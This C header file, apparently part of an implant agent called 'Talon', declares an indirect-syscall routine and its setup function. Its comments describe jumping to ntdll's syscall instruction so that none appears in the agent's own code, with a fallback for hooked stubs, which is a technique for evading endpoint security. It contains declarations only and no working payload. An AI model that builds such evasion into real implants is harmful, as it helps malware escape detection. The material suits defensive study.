#ifndef AGENT_SYSCALL_H
#define AGENT_SYSCALL_H

#include <Talon.h>

typedef struct _SYS_CONFIG {
    PVOID Adr; /* ntdll `syscall` instruction to tail-jump (no 0F 05 in our .text) */
    WORD  Ssn; /* syscall service number */
} SYS_CONFIG, *PSYS_CONFIG;

/* Arg1/Arg2 arrive in rcx/rdx per the Win64 calling convention and are kept
 * there for the syscall; Cfg (3rd arg, r8) carries Adr/Ssn. NTSTATUS in rax. */
NTSTATUS SysInvoke( PVOID Arg1, PVOID Arg2, PSYS_CONFIG Cfg );

/* Resolve ntdll's NtDelayExecution SSN + syscall instruction at startup.
 * Sets Instance.Syscall.Ready on success (incl. hooked-stub fallback). */
VOID TalonSyscallInit( VOID );

#endif
